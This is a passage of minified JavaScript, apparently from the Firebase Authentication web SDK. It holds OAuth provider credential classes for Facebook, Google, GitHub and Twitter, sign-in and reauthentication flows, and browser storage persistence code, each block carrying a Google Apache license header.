credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",t):t())}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class L4{constructor(e,n){this.providerId=e,this.signInMethod=n}toJSON(){return ks("not implemented")}_getIdTokenResponse(e){return ks("not implemented")}_linkToIdToken(e,n){return ks("not implemented")}_getReauthenticationResolver(e){return ks("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function sc(t,e){return Kj(t,"POST","/v1/accounts:signInWithIdp",F_(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wL="http://localhost";class Go extends L4{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const n=new Go(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(n.idToken=e.idToken),e.accessToken&&(n.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(n.nonce=e.nonce),e.pendingToken&&(n.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(n.accessToken=e.oauthToken,n.secret=e.oauthTokenSecret):ts("argument-error"),n}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const n=typeof e=="string"?JSON.parse(e):e,{providerId:i,signInMethod:s}=n,o=V_(n,["providerId","signInMethod"]);if(!i||!s)return null;const c=new Go(i,s);return c.idToken=o.idToken||void 0,c.accessToken=o.accessToken||void 0,c.secret=o.secret,c.nonce=o.nonce,c.pendingToken=o.pendingToken||null,c}_getIdTokenResponse(e){const n=this.buildRequest();return sc(e,n)}_linkToIdToken(e,n){const i=this.buildRequest();return i.idToken=n,sc(e,i)}_getReauthenticationResolver(e){const n=this.buildRequest();return n.autoCreate=!1,sc(e,n)}buildRequest(){const e={requestUri:wL,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const n={};this.idToken&&(n.id_token=this.idToken),this.accessToken&&(n.access_token=this.accessToken),this.secret&&(n.oauth_token_secret=this.secret),n.providerId=this.providerId,this.nonce&&!this.pendingToken&&(n.nonce=this.nonce),e.postBody=Pc(n)}return e}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Y_{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xd extends Y_{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ca extends Xd{constructor(){super("facebook.com")}static credential(e){return Go._fromParams({providerId:Ca.PROVIDER_ID,signInMethod:Ca.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Ca.credentialFromTaggedObject(e)}static credentialFromError(e){return Ca.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Ca.credential(e.oauthAccessToken)}catch{return null}}}Ca.FACEBOOK_SIGN_IN_METHOD="facebook.com";Ca.PROVIDER_ID="facebook.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Rs extends Xd{constructor(){super("google.com"),this.addScope("profile")}static credential(e,n){return Go._fromParams({providerId:Rs.PROVIDER_ID,signInMethod:Rs.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:n})}static credentialFromResult(e){return Rs.credentialFromTaggedObject(e)}static credentialFromError(e){return Rs.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:n,oauthAccessToken:i}=e;if(!n&&!i)return null;try{return Rs.credential(n,i)}catch{return null}}}Rs.GOOGLE_SIGN_IN_METHOD="google.com";Rs.PROVIDER_ID="google.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sa extends Xd{constructor(){super("github.com")}static credential(e){return Go._fromParams({providerId:Sa.PROVIDER_ID,signInMethod:Sa.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Sa.credentialFromTaggedObject(e)}static credentialFromError(e){return Sa.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Sa.credential(e.oauthAccessToken)}catch{return null}}}Sa.GITHUB_SIGN_IN_METHOD="github.com";Sa.PROVIDER_ID="github.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Na extends Xd{constructor(){super("twitter.com")}static credential(e,n){return Go._fromParams({providerId:Na.PROVIDER_ID,signInMethod:Na.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:n})}static credentialFromResult(e){return Na.credentialFromTaggedObject(e)}static credentialFromError(e){return Na.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:n,oauthTokenSecret:i}=e;if(!n||!i)return null;try{return Na.credential(n,i)}catch{return null}}}Na.TWITTER_SIGN_IN_METHOD="twitter.com";Na.PROVIDER_ID="twitter.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xc{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,n,i,s=!1){const o=await yr._fromIdTokenResponse(e,i,s),c=iE(i);return new xc({user:o,providerId:c,_tokenResponse:i,operationType:n})}static async _forOperation(e,n,i){await e._updateTokensIfNecessary(i,!0);const s=iE(i);return new xc({user:e,providerId:s,_tokenResponse:i,operationType:n})}}function iE(t){return t.providerId?t.providerId:"phoneNumber"in t?"phone":null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Im extends Gs{constructor(e,n,i,s){var o;super(n.code,n.message),this.operationType=i,this.user=s,Object.setPrototypeOf(this,Im.prototype),this.customData={appName:e.name,tenantId:(o=e.tenantId)!==null&&o!==void 0?o:void 0,_serverResponse:n.customData._serverResponse,operationType:i}}static _fromErrorAndOperation(e,n,i,s){return new Im(e,n,i,s)}}function V4(t,e,n,i){return(e==="reauthenticate"?n._getReauthenticationResolver(t):n._getIdTokenResponse(t)).catch(o=>{throw o.code==="auth/multi-factor-auth-required"?Im._fromErrorAndOperation(t,o,e,i):o})}async function bL(t,e,n=!1){const i=await Cd(t,e._linkToIdToken(t.auth,await t.getIdToken()),n);return xc._forOperation(t,"link",i)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function xL(t,e,n=!1){const{auth:i}=t;if(rr(i.app))return Promise.reject(Uo(i));const s="reauthenticate";try{const o=await Cd(t,V4(i,s,e,t),n);qe(o.idToken,i,"internal-error");const c=H_(o.idToken);qe(c,i,"internal-error");const{sub:d}=c;return qe(t.uid===d,i,"user-mismatch"),xc._forOperation(t,s,o)}catch(o){throw(o==null?void 0:o.code)==="auth/user-not-found"&&ts(i,"user-mismatch"),o}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function AL(t,e,n=!1){if(rr(t.app))return Promise.reject(Uo(t));const i="signIn",s=await V4(t,i,e),o=await xc._fromIdTokenResponse(t,i,s);return n||await t._updateCurrentUser(o.user),o}function EL(t,e,n,i){return tn(t).onIdTokenChanged(e,n,i)}function TL(t,e,n){return tn(t).beforeAuthStateChanged(e,n)}const km="__sak";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class U4{constructor(e,n){this.storageRetriever=e,this.type=n}_isAvailable(){try{return this.storage?(this.storage.setItem(km,"1"),this.storage.removeItem(km),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,n){return this.storage.setItem(e,JSON.stringify(n)),Promise.resolve()}_get(e){const n=this.storage.getItem(e);return Promise.resolve(n?JSON.parse(n):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const CL=1e3,SL=10;class B4 extends U4{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,n)=>this.onStorageEvent(e,n),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=O4(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const n of Object.keys(this.listeners)){const i=this.storage.getItem(n),s=this.localCache[n];i!==s&&e(n,s,i)}}onStorageEvent(e,n=!1){if(!e.key){this.forAllChangedKeys((c,d,f)=>{this.notifyListeners(c,f)});return}const i=e.key;n?this.detachListener():this.stopPolling();const s=()=>{const c=this.storage.getItem(i);!n&&this.localCache[i]===c||this.notifyListeners(i,c)},o=this.storage.getItem(i);sL()&&o!==e.newValue&&e.newValue!==e.oldValue?setTimeout(s,SL):s()}notifyListeners(e,n){this.localCache[e]=n;const i=this.listeners[e];if(i)for(const s of Array.from(i))s(n&&JSON.parse(n))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,n,i)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:n,newValue:i}),!0)})},CL)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,n){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,n){await super._set(e,n),this.localCache[e]=JSON.stringify(n)}async _get(e){const n=await super._get(e);return this.localCache[e]=JSON.stringify(n),n}async _remove(e){await super._remove(e),delete this.localCache[e]}}B4.type="LOCAL";const NL=B4;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class z4 extends U4{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,n){}_removeListener(e,n){}}z4.type="SESSION";const F4=z4;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function RL(t){return Promise.all(t.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(n){return{fulfilled:!1,reason:n}}}))}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Cp{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const n=this.receivers.find(s=>s.isListeningto(e));if(n)return n;const i=new Cp(e);return this.receivers.push(i),i}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const n=e,{eventId:i,eventType:s,data:o}=n.data,c=this.handlersMap[s];if(!(c!=null&&c.size))return;n.ports[0].postMessage({status:"ack",eventId:i,eventType:s});const d=Array.from(c).map(async p=>p(n.origin,o)),f=await RL(d);n.ports[0].postMessage({status:"done",eventId:i,eventType:s,response:f})}_subscribe(e,n){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(n)}_unsubscribe(e,n){this.handlersMap[e]&&n&&this.handlersMap[e].delete(n),(!n||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}Cp.receivers=[];/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Q_(t="",e=10){let n="";for(let i=0;i<e;i++)n+=Math.floor(Math.random()*10);return t+n}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class IL{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,n,i=50){const s=typeof MessageChannel<"u"?new MessageChannel:null;if(!s)throw new Error("connection_unavailable");let o,c;return new Promise((d,f)=>{const p=Q_("",20);s.port1.start();const v=setTimeout(()=>{f(new Error("unsupported_event"))},i);c={messageChannel:s,onMessage(b){const w=b;if(w.data.eventId===p)switch(w.data.status){case"ack":clearTimeout(v),o=setTimeout(()=>{f(new Error("timeout"))},3e3);break;case"done":clearTimeout(o),d(w.data.response);break;default:clearTimeout(v),clearTimeout(o),f(new Error("invalid_response"));break}}},this.handlers.add(c),s.port1.addEventListener("message",c.onMessage),this.target.postMessage({eventType:e,eventId:p,data:n},[s.port2])}).finally(()=>{c&&this.removeMessageHandler(c)})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Xr(){return window}function kL(t){Xr().location.href=t}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function H4(){return typeof Xr().WorkerGlobalScope<"u"&&typeof Xr().importScripts=="function"}async function DL(){if(!(navigator!=null&&navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function ML(){var t;return((t=navigator==null?void 0:navigator.serviceWorker)===null||t===void 0?void 0:t.controller)||null}function OL(){return H4()?self:null}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const q4="firebaseLocalStorageDb",PL=1,Dm="firebaseLocalStorage",G4="fbase_key";class Zd{constructor(e){this.request=e}toPromise(){return new Promise((e,n)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{n(this.request.error)})})}}function Sp(t,e){return t.transaction([Dm],e?"readwrite":"readonly").objectStore(Dm)}function jL(){const t=indexedDB.deleteDatabase(q4);return new Zd(t).toPromise()}function tv(){const t=indexedDB.open(q4,PL);return new Promise((e,n)=>{t.addEventListener("error",()=>{n(t.error)}),t.addEventListener("upgradeneeded",()=>{const i=t.result;try{i.createObjectStore(Dm,{keyPath:G4})}catch(s){n(s)}}),t.addEventListener("success",async()=>{const i=t.result;i.objectStoreNames.contains(Dm)?e(i):(i.close(),await jL(),e(await tv()))})})}async function rE(t,e,n){const i=Sp(t,!0).put({[G4]:e,value:n});return new Zd(i).toPromise()}async function LL(t,e){const n=Sp(t,!1).get(e),i=await new Zd(n).toPromise();return i===void 0?null:i.value}function sE(t,e){const n=Sp(t,!0).delete(e);return new Zd(n).toPromise()}const VL=800,UL=3;class Y4{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await tv(),this.db)}async _withRetries(e){let n=0;for(;;)try{const i=await this._openDb();return await e(i)}catch(i){if(n++>UL)throw i;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return H4()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=Cp._getInstance(OL()),this.receiver._subscribe("keyChanged",async(e,n)=>({keyProcessed:(await this._poll()).includes(n.key)})),this.receiver._subscribe("ping",async(e,n)=>["keyChanged"])}async initializeSender(){var e,n;if(this.activeServiceWorker=await DL(),!this.activeServiceWorker)return;this.sender=new IL(this.activeServiceWorker);const i=await this.sender._send("ping",{},800);i&&!((e=i[0])===null||e===void 0)&&e.fulfilled&&!((n=i[0])===null||n===void 0)&&n.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||ML()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await tv();return await rE(e,km,"1"),await sE(e,km),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,n){return this._withPendingWrite(async()=>(await this._withRetries(i=>rE(i,e,n)),this.localCache[e]=n,this.notifyServiceWorker(e)))}async _get(e){const n=await this._withRetries(i=>LL(i,e));return this.localCache[e]=n,n}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(n=>sE(n,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(s=>{const o=Sp(s,!1).getAll();return new Zd(o).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const n=[],i=new Set;if(e.length!==0)for(const{fbase_key:s,value:o}of e)i.add(s),JSON.stringify(this.localCache[s])!==JSON.stringify(o)&&(this.notifyListeners(s,o),n.push(s));for(const s of Object.keys(this.localCache))this.localCache[s]&&!i.has(s)&&(this.notifyListeners(s,null),n.push(s));return n}notifyListeners(e,n){this.localCache[e]=n;const i=this.listeners[e];if(i)for(const s of Array.from(i))s(n)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),VL)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,n){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}Y4.type="LOCAL";const BL=Y4;new $d(3e4,6e4);/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Q4(t,e){return e?Ds(e):(qe(t._popupRedirectResolver,t,"argument-error"),t._popupRedirectResolver)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class K_ extends L4{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return sc(e,this._buildIdpRequest())}_linkToIdToken(e,n){return sc(e,this._buildIdpRequest(n))}_getReauthenticationResolver(e){return sc(e,this._buildIdpRequest())}_buildIdpRequest(e){const n={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(n.idToken=e),n}}function zL(t){return AL(t.auth,new K_(t),t.bypassAuthState)}function FL(t){const{auth:e,user:n}=t;return qe(n,e,"internal-error"),xL(n,new K_(t),t.bypassAuthState)}async function HL(t){const{auth:e,user:n}=t;return qe(n,e,"internal-error"),bL(n,new K_(t),t.bypassAuthState)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
